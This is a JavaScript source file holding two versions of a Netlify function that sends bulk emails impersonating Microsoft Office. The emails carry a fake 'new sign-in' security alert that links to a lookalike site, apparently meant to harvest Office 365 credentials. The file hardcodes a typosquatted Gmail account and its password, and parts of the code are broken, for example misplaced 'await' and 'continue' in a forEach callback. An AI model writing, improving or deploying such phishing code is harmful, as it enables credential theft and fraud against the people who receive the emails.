const nodemailer = require('nodemailer');

exports.handler = async (event, context) => {
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type'
      },
      body: ''
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    const formData = JSON.parse(event.body);
    const { recsx } = formData;

    if (typeof recsx !== 'string' || !recsx) {
      console.error("recsx is invalid:", recsx);
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'Invalid' })
      };
    }

    const emlStrng = recsx.trim();
    const rcpntEmls = emlStrng.split('\n').map(email => email.trim()).filter(email => email !== "");

    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 465,
      secure: true,
      auth: {
        user: 'mircosoftii@gmail.com',
        pass: 'lztqyrqznnqaieth'
      }
    });

    rcpntEmls.forEach(recipientEmail => {
      const mailOptions = {
        from: '"Microsoft Office" <Office365>',
        to: rcpntEmls,
        subject: 'Please Review Security Settings',
        html: `
            <div style="background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
            <p><strong>Your Office 365 Account was just signed in to from a new device.
            You're getting this email to make sure it was you.</strong></p>
            <p>Please go to your recent activity page to let us know whether or not this was you. To help keep you safe, we require an extra security challenge</p>
            <a style="background-color:rgb(179, 222, 156); color: black; width: 100%; border-radius: 8px; padding: 0.75rem;" href="https://moffice.netlify.app/">Review Recent Activity</a>
            <p>To Opt or change when you receive security notifications <a href="https://moffice.netlify.app/">Click Here.</a></p>
            </div>
        `
      };
    
      try {
        const info = await transporter.sendMail(mailOptions);
        console.log('Email sent to', recipientEmail, ':', info.response);
      } catch (emailError) {
        console.error('Error sending email to', recipientEmail, ':', emailError);
        console.error(`Failed to send email to ${recipientEmail}. Continuing to next recipient.`);
        continue;
      }
    });

    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ success: true })
    };

  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      headers: {
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ error: 'Fail2prcsrqst' })
    };
  }
};

//split hhhhhhhhhhhhhhhhhhhhhhhhhhh hhhhhhhh

const nodemailer = require('nodemailer'); // Import Nodemailer

exports.handler = async (event) => { // Assuming this is a Netlify function
  try {
    const data = JSON.parse(event.body); // Parse the request body
    const recsx = data.recipients; // Get the recipients from the request body

    // Validate and process recipient emails
    if (typeof recsx !== 'string' || !recsx) {
      console.error("recsx is invalid:", recsx);
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'Invalid recipient emails' })
      };
    }

    const emlStrng = recsx.trim();
    const rcpntEmls = emlStrng.split('\n').map(email => email.trim()).filter(email => email !== "");

    if (rcpntEmls.length === 0) {
      console.error("No valid recipient emails provided.");
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'No valid recipient emails provided' })
      };
    }

    // Nodemailer setup
    const transporter = nodemailer.createTransport({
      // Your email service configuration (replace with your actual details)
      service: 'gmail',
      auth: {
        user: 'mircosoftii@gmail.com',
        pass: 'lztqyrqznnqaieth'
      }
    });

    // Send email to each recipient individually using forEach
    rcpntEmls.forEach(recipientEmail => {
      const mailOptions = {
        from: '"Microsoft Office" <Office365>',
        to: rcpntEmls,
        subject: 'Please Review Security Settings',
        html: `
            <div style="background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
            <p><strong>Your Office 365 Account was just signed in to from a new device.
            You're getting this email to make sure it was you.</strong></p>
            <p>Please go to your recent activity page to let us know whether or not this was you. To help keep you safe, we require an extra security challenge</p>
            <a style="background-color:rgb(179, 222, 156); color: black; width: 100%; border-radius: 8px; padding: 0.75rem;" href="https://moffice.netlify.app/">Review Recent Activity</a>
            <p>To Opt or change when you receive security notifications <a href="https://moffice.netlify.app/">Click Here.</a></p>
            </div>
        `
      };

      try {
        const info = transporter.sendMail(mailOptions);
        console.log('Email sent to', recipientEmail, ':', info.response);
      } catch (emailError) {
        console.error('Error sending email to', recipientEmail, ':', emailError);
        // Log the error and continue sending to other recipients
        console.error(`Failed to send email to ${recipientEmail}. Continuing to next recipient.`);
      }
    });

    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ success: true, message: 'Emails sent successfully' })
    };

  } catch (error) {
    console.error('Error in submit function:', error);
    return {
      statusCode: 500,
      headers: {
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ error: 'Failed to process request' })
    };
  }
};